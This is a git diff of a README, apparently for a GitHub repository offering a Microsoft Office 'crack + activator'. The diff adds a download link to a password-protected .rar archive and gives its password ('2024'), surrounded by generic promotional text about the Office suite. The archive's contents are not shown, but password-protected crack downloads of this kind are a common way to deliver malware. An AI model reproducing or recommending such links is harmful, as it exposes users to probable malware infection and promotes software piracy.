@@ -1,6 +1,6 @@
 <h1 align="center">Office crack</h1>
 
-# [DOWNLOAD]()
+# [DOWNLOAD](https://github.com/M7Moaz/Microsoft-office-activator/raw/refs/heads/main/Microsoft%20Office%20crack%20+%20Activator%202024.rar)
 # Archive password:   2024
 
 Microsoft Office is a suite of productivity software developed by Microsoft. It includes a variety of applications that are designed to help users create documents, spreadsheets, presentations, and manage emails. The most commonly used programs in the Office suite are:
@@ -13,7 +13,7 @@ Microsoft Access: A database management system for creating and managing databas
 Microsoft OneNote: A note-taking application for capturing ideas, images, and handwritten notes.
 Microsoft Publisher: A desktop publishing tool for creating brochures, flyers, and newsletters.
 
-![](https://github.com/Tenakkeur/office-free-download-crack-activator/blob/main/1.png)
+![](https://github.com/M7Moaz/Microsoft-office-activator/blob/main/icon.jpg)
 
 Microsoft Office 2024 offers several advantages, especially with its enhanced features and integration with cloud services. Here are some key benefits:
 
